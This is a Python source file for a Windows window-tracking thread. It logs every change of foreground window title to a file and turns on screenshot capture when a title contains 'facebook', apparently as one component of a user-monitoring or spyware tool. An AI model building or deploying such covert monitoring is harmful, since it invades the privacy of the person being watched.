import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot



class WindowTracker(Thread):


    def __init__(self, screenshot:Screenshot, filehandler):
        Thread.__init__(self, name='window tracking')
        self.__activeWindow = None
        self.__samplingFrequency = 0.1
        self.__screenshot = screenshot
        self.__screenshotTrigger = ['facebook']
        self.__filehandler = filehandler



    def run(self):
        while True:
            time.sleep(self.__samplingFrequency)
            activeWindow = win32gui.GetForegroundWindow()
            activeWindowText = win32gui.GetWindowText(activeWindow)
            self.checkWindow(activeWindowText)
            self.checkTrigger(activeWindowText)



    def checkWindow(self, activeWindowText:str) -> None:
        if self.__activeWindow != activeWindowText:
            self.__activeWindow = activeWindowText
            string = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            self.__filehandler.writeToFile(string)



    def checkTrigger(self, activeWindowText:str):
        for trigger in self.__screenshotTrigger:
            if trigger in activeWindowText.lower():
                self.__screenshot.isActive = True
            else:
                self.__screenshot.isActive = False
